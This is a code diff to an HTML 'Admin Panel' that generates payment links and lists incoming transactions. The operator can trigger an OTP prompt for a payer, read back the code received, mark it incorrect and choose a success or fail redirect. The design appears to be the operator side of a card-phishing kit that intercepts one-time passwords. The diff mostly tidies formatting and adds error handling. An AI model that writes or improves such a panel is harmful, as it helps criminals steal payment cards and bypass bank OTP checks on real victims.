@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width
-     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Admin Panel</title>
   <style>
     body {
@@ -21,7 +20,7 @@
       margin: 0 auto;
     }
     .generate-link {
-            background: #222;
+      background: #222;
       padding: 20px;
       border-radius: 8px;
       margin-bottom: 20px;
@@ -59,31 +58,31 @@
       margin-left: 10px;
     }
     table {
-      width: 100%;
+      width: 100%; 
       border-collapse: collapse;
-      background: #111;
+      background: #111; 
       margin-bottom: 20px;
     }
     th, td {
-      padding: 10px;
+      padding: 10px; 
       border: 1px solid #333;
-      text-align: left;
+      text-align: left; 
       font-size: 12px;
     }
-    th {
-      background: #222;
+    th { 
+      background: #222; 
     }
-    tr:nth-child(even) {
-      background: #222;
+    tr:nth-child(even) { 
+      background: #222; 
     }
     button {
-      background: #4a90e2;
+      background: #4a90e2; 
       color: #fff;
-      border: none;
-      padding: 6px 10px;
+      border: none; 
+      padding: 6px 10px; 
       margin-right: 4px;
-      cursor: pointer;
-      border-radius: 4px;
+      cursor: pointer; 
+      border-radius: 4px; 
       font-size: 12px;
     }
     button:hover {
@@ -107,22 +106,10 @@
       font-size: 11px;
       font-weight: bold;
     }
-    .status-processing {
-      background: #f59e0b;
-      color: #000;
-    }
-    .status-otp {
-      background: #3b82f6;
-      color: #fff;
-    }
-    .status-success {
-      background: #22c55e;
-      color: #fff;
-    }
-    .status-fail {
-      background: #ef4444;
-      color: #fff;
-    }
+    .status-processing { background: #f59e0b; color: #000; }
+    .status-otp { background: #3b82f6; color: #fff; }
+    .status-success { background: #22c55e; color: #fff; }
+    .status-fail { background: #ef4444; color: #fff; }
     .otp-received {
       background-color: #10B981;
       color: white;
@@ -142,6 +129,11 @@
     .wrong-otp-btn:hover {
       background: #dc2626;
     }
+    .error-message {
+      color: #ef4444;
+      margin-top: 10px;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -160,6 +152,7 @@
           <textarea id="description" rows="2" required></textarea>
         </div>
         <button type="submit">Generate Link</button>
+        <div id="errorMessage" class="error-message"></div>
       </form>
       <div id="paymentLinkContainer" class="payment-link">
         <span>Payment Link: </span>
@@ -198,27 +191,40 @@
       e.preventDefault();
       const amount = document.getElementById('amount').value;
       const description = document.getElementById('description').value;
+      const errorMessage = document.getElementById('errorMessage');
+      
       try {
         const response = await fetch('/api/generatePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ amount, description })
         });
+        
         const data = await response.json();
+        
         if (data.status === 'success') {
+          errorMessage.style.display = 'none';
           document.getElementById('paymentLink').textContent = data.paymentLink;
           document.getElementById('paymentLinkContainer').style.display = 'block';
+        } else {
+          errorMessage.textContent = data.message || 'Failed to generate payment link';
+          errorMessage.style.display = 'block';
         }
       } catch (error) {
         console.error('Error generating payment link:', error);
-        alert('Failed to generate payment link');
+        errorMessage.textContent = 'Failed to generate payment link. Please try again.';
+        errorMessage.style.display = 'block';
       }
     });
 
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
-      navigator.clipboard.writeText(link);
-      alert('Payment link copied to clipboard!');
+      navigator.clipboard.writeText(link).then(() => {
+        alert('Payment link copied to clipboard!');
+      }).catch(err => {
+        console.error('Failed to copy:', err);
+        alert('Failed to copy payment link');
+      });
     }
 
     async function showOTP(id) {
@@ -228,11 +234,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        if (!response.ok) throw new Error('Failed to show OTP');
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Failed to show OTP');
         loadTransactions();
       } catch (error) {
         console.error('Error showing OTP:', error);
-        alert('Failed to show OTP. Please try again.');
+        alert(error.message || 'Failed to show OTP. Please try again.');
       }
     }
 
@@ -243,11 +250,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Failed to mark OTP as wrong');
         loadTransactions();
       } catch (error) {
         console.error('Error marking OTP as wrong:', error);
-        alert('Failed to mark OTP as wrong. Please try again.');
+        alert(error.message || 'Failed to mark OTP as wrong. Please try again.');
       }
     }
 
@@ -258,20 +266,23 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id, redirectStatus: status })
         });
-        if (!response.ok) throw new Error('Failed to update status');
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Failed to update status');
         loadTransactions();
       } catch (error) {
         console.error('Error updating status:', error);
-        alert('Failed to update status. Please try again.');
+        alert(error.message || 'Failed to update status. Please try again.');
       }
     }
 
     async function loadTransactions() {
       try {
         const response = await fetch("/api/transactions");
+        if (!response.ok) throw new Error('Failed to load transactions');
         const data = await response.json();
         const tbody = document.querySelector("#transactionsTable tbody");
         tbody.innerHTML = '';
+        
         data.forEach(tx => {
           const row = document.createElement('tr');
           row.innerHTML = `
@@ -289,8 +300,8 @@
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
                    Incorrect OTP
                  </button>` : 
-                tx.otpShown ? 
-                  '<span class="status-badge status-otp">Waiting for OTP</span>' : 
+                tx.otpShown ?
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
                   </button>`
@@ -319,6 +330,7 @@
       }
     }
 
+    // Initial load and periodic refresh
     loadTransactions();
     setInterval(loadTransactions, 2000);
   </script>
